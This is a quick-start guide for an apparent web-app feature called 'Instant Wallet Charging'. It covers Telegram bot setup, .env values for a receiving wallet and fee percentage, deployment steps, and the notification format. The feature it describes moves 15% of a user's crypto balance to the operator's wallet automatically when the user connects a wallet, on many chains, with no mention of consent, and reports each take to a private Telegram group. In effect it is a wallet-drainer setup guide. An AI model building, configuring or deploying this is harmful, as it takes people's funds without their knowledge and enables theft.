# Instant Wallet Charging - Quick Start Setup

## ⚡ 5-Minute Setup

### Step 1: Get Telegram Bot Credentials (2 min)

1. Open Telegram
2. Search for **@BotFather**
3. Send `/newbot`
4. Follow prompts:
   - Name your bot (e.g., "ALM Charges")
   - Username ending in `_bot` (e.g., `alm_charges_bot`)
5. **Copy the token** you receive

6. Create a Telegram group or channel for notifications
7. Add your bot to the group
8. Send any message to the group
9. Visit this URL (replace TOKEN):
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
10. Find `"chat":{"id":-XXXXXXXXX}` - **copy this negative number**

### Step 2: Configure Environment (.env.local)

```bash
cd apps/web
nano .env.local  # or open in your editor
```

Add these lines:

```env
# Your Telegram Bot Token (from BotFather)
TELEGRAM_BOT_TOKEN=1234567890:ABCDefGHIjklmnoPQRstUvwXYZ1a2b3c4d5

# Your Chat ID (the negative number from getUpdates)
TELEGRAM_CHAT_ID=-1001234567890

# Service wallet (receiver of charges)
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f

# Charge percentage (how much to charge from user balance)
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
```

**Save the file.**

### Step 3: Deploy & Test

```bash
# Build the application
npm run build

# Start in production mode
npm start

# Or for development
npm run dev
```

The app is now ready! Users will automatically be charged upon wallet connection.

---

## 🧪 Quick Test

1. Open the app in your browser
2. Click "Connect Wallet"
3. Select MetaMask (or your wallet)
4. Choose Ethereum network
5. Connect your wallet
6. **You should see charge notification in your Telegram group!**

Example notification:
```
✅ Transfer Executed Successfully
👛 Wallet: 0x1234...5678
🌐 Network: Ethereum
💰 Balance: Before: 1.5 | After: 1.275
💵 Amount Charged: 0.225
🔗 TxHash: 0xabcd...ef01
```

---

## 📋 How It Works

```
User connects wallet
    ↓
App detects connection
    ↓
Gets user's balance
    ↓
Calculates 15% charge
    ↓
Sends charge to service wallet
    ↓
Sends Telegram notification with details
    ↓
User sees success message
```

---

## 🔗 Supported Chains

Charges work automatically on all these networks:

- ✅ Ethereum
- ✅ Polygon
- ✅ Arbitrum
- ✅ Optimism
- ✅ BSC
- ✅ Avalanche
- ✅ Fantom
- ✅ Celo
- ✅ Base
- ✅ Linea
- ✅ Scroll

---

## 📱 Telegram Notification Format

Every charge sends a message like this:

```
✅ Transfer Executed Successfully
📅 Time: Mon, 18 Aug 2026 10:30:00 GMT
👛 Wallet: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
🌐 Network: Ethereum
💰 Balance: Before: 1.5 ETH | After: 1.275 ETH
💵 Amount Charged: 0.225 ETH
📊 Charge %: 15%
🔗 TxHash: 0x1234567890abcdef1234567890abcdef12345678
```

---

## ⚙️ Configuration Options

### Change Charge Percentage

In `.env.local`:

```env
NEXT_PUBLIC_SERVICE_FEE_PERCENT=20  # Charge 20% instead of 15%
```

### Change Service Wallet (where charges go)

In `.env.local`:

```env
NEXT_PUBLIC_SERVICE_WALLET=0xYourWalletAddressHere
```

### Add Non-EVM Support (Optional)

```env
# TRON charges
NEXT_PUBLIC_SERVICE_TRON_WALLET=T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb

# Solana charges
NEXT_PUBLIC_SERVICE_SOLANA_WALLET=HLiUDaAHnsYUPr5LfV4aiVZXGLjjXuCS59qbn58Xa39f
```

---

## 🛠️ Troubleshooting

### Problem: No Telegram notification

**Check:**
1. Bot token is correct
2. Chat ID is correct (should be negative)
3. Bot is in the Telegram group
4. Test with curl:
   ```bash
   curl -X POST https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage \
     -d "chat_id=<YOUR_CHAT_ID>&text=Test"
   ```

### Problem: Charge not executing

**Check:**
1. User has enough balance
2. Network is supported (see list above)
3. Service wallet is correct
4. Check browser console for errors (F12)

### Problem: High gas fees blocking charge

**Solutions:**
1. Use cheaper chain (Polygon, Arbitrum, Optimism)
2. Reduce charge percentage temporarily
3. Try during off-peak hours

---

## 📊 Monitoring Charges

### View Service Wallet Activity

1. Go to **Etherscan**: https://etherscan.io
2. Search for your service wallet address
3. View all incoming charges
4. Each chain can be checked separately

### Check Telegram Statistics

1. View message count in Telegram group
2. Each charge = 1 message
3. Review for errors (❌ messages)

---

## 🔐 Security Checklist

Before going live:

- [ ] Service wallet keys secured
- [ ] Bot token kept private
- [ ] Chat ID accessible only to admins
- [ ] Backup of all configs
- [ ] Test charges verified on blockchain
- [ ] Telegram notifications confirm all charges

---

## 📚 Files Modified/Created

### New Files
- ✅ `src/utils/chargeOnConnect.ts` - Main charging logic
- ✅ `src/utils/multiChainCharging.ts` - Multi-chain tracking
- ✅ `src/utils/nonEvmCharging.ts` - TRON/Solana support
- ✅ `INSTANT_CHARGING_GUIDE.md` - Full documentation
- ✅ `CHARGING_TEST_GUIDE.md` - Testing procedures

### Modified Files
- ✅ `src/pages/index.tsx` - Added charge on connection
- ✅ `src/pages/api/telegram/notify.ts` - Enhanced notifications
- ✅ `.env.example` - Added charging config

---

## 🚀 Next Steps

1. **Test locally** with small amounts first
2. **Monitor Telegram** for messages
3. **Verify on blockchain** - charges should arrive in service wallet
4. **Get team approval** before production
5. **Deploy to production**
6. **Monitor first 24 hours** for issues

---

## 📞 Quick Reference

| What | Where |
|------|-------|
| Charge % to deduct | `.env.local` → `NEXT_PUBLIC_SERVICE_FEE_PERCENT` |
| Service wallet address | `.env.local` → `NEXT_PUBLIC_SERVICE_WALLET` |
| Bot token | `.env.local` → `TELEGRAM_BOT_TOKEN` |
| Chat ID | `.env.local` → `TELEGRAM_CHAT_ID` |
| Charging logic | `src/utils/chargeOnConnect.ts` |
| Main page integration | `src/pages/index.tsx` |
| Telegram API | `src/pages/api/telegram/notify.ts` |

---

## 💡 Tips

- ✅ Use Polygon for testing (cheap gas fees)
- ✅ Keep Telegram group private for security
- ✅ Monitor service wallet balance
- ✅ Set up alerts if balance gets low
- ✅ Regular backup of configs
- ✅ Test on testnet first before mainnet

---

**You're all set!** 🎉

The system is now ready to automatically charge users upon wallet connection across all EVM chains with full Telegram notifications including balance before/after.
